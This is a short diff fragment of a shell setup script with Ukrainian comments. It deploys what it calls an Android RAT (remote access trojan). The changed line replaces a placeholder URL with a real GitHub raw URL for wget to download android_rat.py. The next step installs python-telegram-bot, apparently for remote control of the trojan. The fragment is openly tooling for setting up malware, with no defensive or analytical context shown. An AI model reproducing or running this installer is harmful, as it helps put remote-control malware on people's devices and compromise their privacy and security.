@@ -22,7 +22,7 @@ fi
 
 # 3) Закачуємо код android_rat.py
 echo "[*] Завантажуємо android_rat.py..."
-wget -q -O "$RAT_DIR/android_rat.py" "https://example.com/android_rat.py"
+wget -q -O "$RAT_DIR/android_rat.py" "https://raw.githubusercontent.com/myst1112/AndroidNektiq/main/android_rat.py"
 
 # 4) Встановлюємо python-бібліотеку python-telegram-bot
 echo "[*] Встановлюємо python-telegram-bot..."
